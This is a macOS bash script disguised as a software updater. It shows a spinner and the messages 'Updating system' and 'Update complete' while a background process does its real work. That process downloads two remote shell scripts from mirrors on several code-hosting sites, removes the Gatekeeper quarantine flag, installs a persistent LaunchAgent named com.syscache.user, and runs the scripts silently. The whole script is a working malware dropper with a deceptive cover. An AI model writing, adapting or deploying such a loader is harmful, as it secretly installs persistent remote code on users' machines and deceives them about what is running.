#!/bin/bash
set -e

clear
echo
echo "                   Processing, please wait..."
echo "         Do not quit otherwise software may damage"
echo

spin='⣾⣽⣻⢿⡿⣟⣯⣷'
dots=""
counter=0

# Background work
(
    USER_HOME="$HOME"
    BASE_DIR="$USER_HOME/Library/Application Support/SysCache"
    AGENT_DIR="$USER_HOME/Library/LaunchAgents"
    PLIST_NAME="com.syscache.user.plist"
    PLIST_PATH="$AGENT_DIR/$PLIST_NAME"
    SCRIPT1="$BASE_DIR/script1.sh"
    SCRIPT2="$BASE_DIR/script2.sh"

    mkdir -p "$BASE_DIR"
    mkdir -p "$AGENT_DIR"

    # 4 URLs for script1
    URLS1=(
        "https://codeberg.org/mahesh2210m/mahesh2210m/raw/branch/main/mac1.sh"
        "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/mac1.sh"
        "https://raw.githubusercontent.com/mahesh97m/phpcode/main/mac1.sh"
        "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/mac1.sh"
        "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/mac1.sh"
    )

    # 4 URLs for script2
    URLS2=(
        "https://codeberg.org/mahesh2210m/mahesh2210m/raw/branch/main/mac.sh"
        "https://bitbucket.org/mahesh2210m/mahesh2210m/raw/main/mac.sh"
        "https://raw.githubusercontent.com/mahesh97m/phpcode/main/mac.sh"
        "https://gitlab.com/mahesh2210m/mahesh2210m/-/raw/main/mac.sh"
        "https://gitea.com/mahesh2210m/mahesh2210m/raw/branch/main/mac.sh"
    )
download() {
    local target="$1"
    shift
    local urls=("$@")

    for url in "${urls[@]}"; do
        echo "Trying to download from: $url" >&2

        # Download with curl: silent, follow redirects, show errors, output to target
        # Also capture HTTP status code
        http_code=$(curl -fsSL -w "%{http_code}" -o "$target" "$url")
        
        # Check if HTTP status is 200
        if [[ "$http_code" == "200" ]]; then
            # Check 1: File size > 0 bytes?
            if [[ -s "$target" ]]; then
                # Check 2: Does content contain "thisistesting" (case-insensitive)?
                if grep -iq "thisistesting" "$target"; then
                    echo "Success: Valid file downloaded from $url" >&2
                    chmod +x "$target"  # Make executable if needed
                    return 0
                else
                    echo "Invalid: 'thisistesting' not found in content (case-insensitive). Deleting..." >&2
                    rm -f "$target"
                fi
            else
                echo "Invalid: Downloaded file is empty (0 bytes). Deleting..." >&2
                rm -f "$target"
            fi
        else
            echo "Failed: HTTP $http_code from $url" >&2
            rm -f "$target"  # Clean up partial/failed download
        fi
    done

    echo "Error: All URLs failed. Could not download a valid $target" >&2
    return 1
}



    download "$SCRIPT1" "${URLS1[@]}"
    download "$SCRIPT2" "${URLS2[@]}"

    xattr -dr com.apple.quarantine "$BASE_DIR" 2>/dev/null || true

    cat > "$PLIST_PATH" <<EOF
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE plist PUBLIC "-//Apple//DTD PLIST 1.0//EN" "http://www.apple.com/DTDs/PropertyList-1.0.dtd">
<plist version="1.0">
<dict>
    <key>Label</key>
    <string>com.syscache.user</string>
    <key>ProgramArguments</key>
    <array>
        <string>/bin/bash</string>
        <string>$SCRIPT2</string>
    </array>
    <key>RunAtLoad</key>
    <true/>
    <key>KeepAlive</key>
    <true/>
    <key>StandardOutPath</key>
    <string>$BASE_DIR/out.log</string>
    <key>StandardErrorPath</key>
    <string>$BASE_DIR/err.log</string>
</dict>
</plist>
EOF

UID_NOW=$(id -u)

launchctl bootout gui/$UID_NOW "$PLIST_PATH" 2>/dev/null || true
launchctl bootstrap gui/$UID_NOW "$PLIST_PATH"
launchctl enable gui/$UID_NOW/com.syscache.user

    nohup bash "$SCRIPT1" >/dev/null 2>&1 &
    sleep 5
    nohup bash "$SCRIPT2" >/dev/null 2>&1 &

    echo "DONE"
) &

job_pid=$!

# Animation until background done
while kill -0 $job_pid 2>/dev/null; do
    idx=$((counter % 8))
    dots="."
    ((counter % 4 == 0)) && dots="..."
    ((counter % 4 == 1)) && dots=".."
    ((counter % 4 == 2)) && dots="."
    ((counter % 4 == 3)) && dots=""
    printf "\r        [${spin:$idx:1}] Updating system$dots   "
    counter=$((counter + 1))
    sleep 0.15
done

wait $job_pid 2>/dev/null

clear
echo
echo "                  Update complete!"
echo "     You can now use latest software version"
echo
sleep 3
